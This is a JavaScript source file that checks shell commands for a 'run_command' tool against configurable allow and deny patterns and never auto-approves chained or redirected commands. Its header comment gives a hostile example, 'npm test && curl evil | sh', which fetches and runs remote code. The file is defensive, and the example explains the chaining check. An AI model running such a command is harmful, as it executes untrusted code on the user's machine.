/**
 * Allow / deny rules for run_command, from settings.rules:
 *   "rules": { "allowCommands": ["npm test*", "git status", "git diff*"], "denyCommands": ["git push*", "rm *"] }
 * "*" matches anything. deny wins over allow. A command that chains or redirects (; & | < > ` $( or a new line)
 * is NEVER auto-allowed (so "npm test && curl evil | sh" still asks), and deny rules are tested on every part
 * of a chained command.
 */
const CHAIN = /[;&|<>`\n]|\$\(/;

function toRegExp(pattern) {
  const escaped = String(pattern).trim().replace(/[.+?^${}()|[\]\\]/g, '\\$&').replace(/\*/g, '.*');
  return new RegExp(`^${escaped}$`, 'i');
}

const matches = (patterns, text) => (patterns ?? []).some((p) => typeof p === 'string' && p.trim() && toRegExp(p).test(text.trim()));

/** Returns 'deny' | 'allow' | null (no rule applies -> normal approval). */
export function checkCommandRules(command, rules = {}) {
  const cmd = String(command ?? '').trim();
  if (!cmd) return null;
  const parts = cmd.split(/&&|\|\||[;|&\n]/).map((x) => x.trim()).filter(Boolean);
  if (matches(rules.denyCommands, cmd) || parts.some((x) => matches(rules.denyCommands, x))) return 'deny';
  if (!CHAIN.test(cmd) && matches(rules.allowCommands, cmd)) return 'allow';
  return null;
}
